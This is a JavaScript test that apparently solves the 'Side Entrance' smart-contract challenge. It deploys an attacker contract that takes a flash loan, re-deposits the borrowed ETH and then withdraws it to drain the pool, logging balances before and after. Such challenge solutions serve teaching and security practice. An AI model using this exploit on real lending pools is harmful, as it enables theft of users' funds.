/**
 * Exploit for the Side Entrance vulnerability
 * 
 * This exploitation uses the inconsistency between the flashloan system
 * and the deposit/withdrawal system to drain the pool of all its ETH.
 */

it('Exploit', async function () {
    console.log('Initial pool balance:', (await balance.current(this.pool.address)).toString());
    console.log('Initial attacker balance:', (await balance.current(attacker)).toString());
    
    // 1. Deploy the attacker contract
    const SideEntranceAttacker = contract.fromArtifact('SideEntranceAttacker');
    this.attackerContract = await SideEntranceAttacker.new(this.pool.address, { from: attacker });
    
    // 2. Execute the attack - this function calls flashLoan which triggers execute()
    await this.attackerContract.attack({ from: attacker });
    
    // 3. Recover the funds - this function calls withdraw() from the pool then transfers ETH to the attacker
    await this.attackerContract.withdraw({ from: attacker });
    
    console.log('Final pool balance:', (await balance.current(this.pool.address)).toString());
    console.log('Final attacker balance:', (await balance.current(attacker)).toString());
});